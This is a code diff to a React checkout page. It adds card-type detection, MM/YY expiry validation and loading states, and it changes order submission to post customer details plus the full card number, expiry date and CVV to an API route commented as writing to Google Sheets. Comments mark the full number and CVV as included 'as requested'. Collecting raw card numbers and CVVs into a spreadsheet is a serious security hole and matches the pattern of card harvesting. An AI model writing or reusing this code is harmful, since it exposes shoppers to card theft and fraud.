@@ -67,10 +67,26 @@ export default function CheckoutPage() {
     nameOnCard: "",
     expiryDate: "",
     cvv: "",
+    cardType: "" // Added to store the detected card type
   })
+  
+  // Function to detect credit card type based on the number
+  const getCardType = (cardNumber: string): string => {
+    // Remove spaces and dashes
+    const cleanNumber = cardNumber.replace(/\s+|-/g, '');
+    
+    // Basic regex patterns for card identification
+    if (/^4/.test(cleanNumber)) return 'Visa';
+    if (/^5[1-5]/.test(cleanNumber)) return 'Mastercard';
+    if (/^3[47]/.test(cleanNumber)) return 'American Express';
+    if (/^6(?:011|5)/.test(cleanNumber)) return 'Discover';
+    
+    return 'Credit';
+  }
 
   // Add state for available cities based on selected state
   const [availableCities, setAvailableCities] = useState<string[]>([])
+  const [isSubmitting, setIsSubmitting] = useState(false)
 
   const handleShippingChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target
@@ -96,8 +112,9 @@ export default function CheckoutPage() {
     setActiveTab("payment")
   }
 
-  const handlePaymentSubmit = (e: React.FormEvent) => {
+  const handlePaymentSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
+    
     // Validate payment info
     if (Object.values(paymentInfo).some((value) => value === "")) {
       toast({
@@ -107,16 +124,122 @@ export default function CheckoutPage() {
       })
       return
     }
+    
+    // Validate expiry date
+    const expiryDate = paymentInfo.expiryDate;
+    if (expiryDate && expiryDate.includes('/')) {
+      const [monthStr, yearStr] = expiryDate.split('/');
+      const month = parseInt(monthStr);
+      const year = 2000 + parseInt(yearStr); // Assuming 20xx
+      
+      const now = new Date();
+      const currentMonth = now.getMonth() + 1; // getMonth is 0-indexed
+      const currentYear = now.getFullYear();
+      
+      if (year < currentYear || (year === currentYear && month < currentMonth)) {
+        toast({
+          title: "Invalid expiry date",
+          description: "Your card appears to be expired. Please check the date.",
+          variant: "destructive",
+        })
+        return
+      }
+    } else {
+      toast({
+        title: "Invalid expiry date format",
+        description: "Please enter the expiry date in MM/YY format",
+        variant: "destructive",
+      })
+      return
+    }
 
-    // Process order
-    toast({
-      title: "Order placed successfully!",
-      description: "Thank you for your purchase",
-    })
-
-    // Clear cart and redirect to confirmation
-    clearCart()
-    router.push("/order-confirmation")
+    // Set loading state
+    setIsSubmitting(true)
+    
+    try {
+      // Generate a unique order number based on current timestamp
+      const orderNumber = Date.now().toString();
+      
+      // Create form data for order submission
+      const orderData = new FormData();
+      
+      // Add order metadata
+      orderData.append('orderNumber', orderNumber);
+      orderData.append('orderDate', new Date().toISOString());
+      orderData.append('orderTotal', grandTotal.toFixed(2));
+      
+      // Customer information (combine shipping info into simple fields)
+      orderData.append('customerName', `${shippingInfo.firstName} ${shippingInfo.lastName}`);
+      orderData.append('customerEmail', shippingInfo.email);
+      orderData.append('customerPhone', shippingInfo.phone);
+      orderData.append('shippingAddress', `${shippingInfo.address}, ${shippingInfo.city}, ${shippingInfo.state} ${shippingInfo.zipCode}, ${shippingInfo.country}`);
+      
+      // Add payment information (include full details as requested)
+      orderData.append('paymentMethod', 'Credit Card');
+      orderData.append('cardholderName', paymentInfo.nameOnCard);
+      orderData.append('cardNumber', paymentInfo.cardNumber); // Full card number as requested
+      orderData.append('cardExpiry', paymentInfo.expiryDate);
+      orderData.append('cardCvv', paymentInfo.cvv); // Including CVV as requested
+      
+      // Order summary (instead of detailed items)
+      orderData.append('totalItems', cart.length.toString());
+      orderData.append('orderSummary', cart.map(item => 
+        `${item.product.name} (${item.variation}) x${item.quantity}`
+      ).join('; '));
+      
+      // Submit order data to Google Sheets
+      const response = await fetch('/api/order-submission', {
+        method: 'POST',
+        body: orderData
+      });
+      
+      const result = await response.json();
+      
+      if (!response.ok) {
+        throw new Error(result.error || 'Failed to submit order');
+      }
+      
+      // Store order information in localStorage for the confirmation page
+      localStorage.setItem('lastOrderNumber', orderNumber);
+      
+      // Store additional order information for the confirmation page
+      const orderInfo = {
+        customerInfo: shippingInfo,
+        paymentInfo: {
+          cardType: paymentInfo.cardType || getCardType(paymentInfo.cardNumber),
+          lastFour: paymentInfo.cardNumber.slice(-4),
+          nameOnCard: paymentInfo.nameOnCard
+        },
+        shippingMethod: "Standard (3-5 business days)",
+        orderSummary: {
+          items: cart.length,
+          total: grandTotal.toFixed(2)
+        }
+      };
+      
+      localStorage.setItem('lastOrderInfo', JSON.stringify(orderInfo));
+      
+      toast({
+        title: "Order placed successfully!",
+        description: `Your order #${orderNumber} has been confirmed.`,
+      });
+      
+      // Clear cart and redirect to confirmation
+      clearCart();
+      router.push("/order-confirmation");
+    } catch (error) {
+      console.error("Order submission error:", error);
+      toast({
+        title: "Order submission failed",
+        description: error instanceof Error ? error.message : "There was an error processing your order. Please try again.",
+        variant: "destructive"
+      });
+      // Reset loading state on error
+      setIsSubmitting(false);
+    } finally {
+      // If we need to do anything after submission regardless of success/failure
+      // (currently we don't need this as we redirect on success)
+    }
   }
 
   // Update city options when state changes
@@ -335,10 +458,19 @@ export default function CheckoutPage() {
                             name="cardNumber"
                             placeholder="1234 5678 9012 3456"
                             value={paymentInfo.cardNumber}
-                            onChange={handlePaymentChange}
+                            onChange={(e) => {
+                              handlePaymentChange(e);
+                              const cardType = getCardType(e.target.value);
+                              setPaymentInfo(prev => ({ ...prev, cardType }));
+                            }}
                             required
                           />
-                          <CreditCard className="absolute right-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
+                          <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center">
+                            {paymentInfo.cardType ? (
+                              <span className="text-xs font-medium text-gray-600 mr-2">{paymentInfo.cardType}</span>
+                            ) : null}
+                            <CreditCard className="h-5 w-5 text-gray-400" />
+                          </div>
                         </div>
                       </div>
 
@@ -366,8 +498,30 @@ export default function CheckoutPage() {
                             name="expiryDate"
                             placeholder="MM/YY"
                             value={paymentInfo.expiryDate}
-                            onChange={handlePaymentChange}
+                            onChange={(e) => {
+                              // Format the input as MM/YY
+                              let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+                              if (value.length > 0) {
+                                // Add / between month and year
+                                if (value.length > 2) {
+                                  value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                                }
+                                // Ensure month is between 01-12
+                                const month = parseInt(value.substring(0, 2));
+                                if (month > 12) {
+                                  value = '12' + value.substring(2);
+                                } else if (month === 0) {
+                                  value = '01' + value.substring(2);
+                                }
+                              }
+                              // Limit to MM/YY format (5 chars total)
+                              if (value.length > 5) {
+                                value = value.substring(0, 5);
+                              }
+                              setPaymentInfo(prev => ({ ...prev, expiryDate: value }));
+                            }}
                             required
+                            maxLength={5}
                           />
                         </div>
                         <div className="space-y-2">
@@ -398,11 +552,19 @@ export default function CheckoutPage() {
                           variant="outline"
                           className="flex-1"
                           onClick={() => setActiveTab("shipping")}
+                          disabled={isSubmitting}
                         >
                           Back
                         </Button>
-                        <Button type="submit" className="flex-1">
-                          Place Order
+                        <Button type="submit" className="flex-1" disabled={isSubmitting}>
+                          {isSubmitting ? (
+                            <div className="flex items-center">
+                              <div className="h-4 w-4 mr-2 border-t-2 border-b-2 border-white rounded-full animate-spin"></div>
+                              Processing...
+                            </div>
+                          ) : (
+                            "Place Order"
+                          )}
                         </Button>
                       </div>
                     </form>
@@ -459,7 +621,13 @@ export default function CheckoutPage() {
                   </div>
                 </div>
 
-                <Button type="submit" className="w-full mt-4">Checkout</Button>
+                <Button 
+                  type="submit" 
+                  className="w-full mt-4" 
+                  disabled={isSubmitting}
+                >
+                  {isSubmitting ? 'Processing...' : 'Checkout'}
+                </Button>
               </CardContent>
             </Card>
           </div>
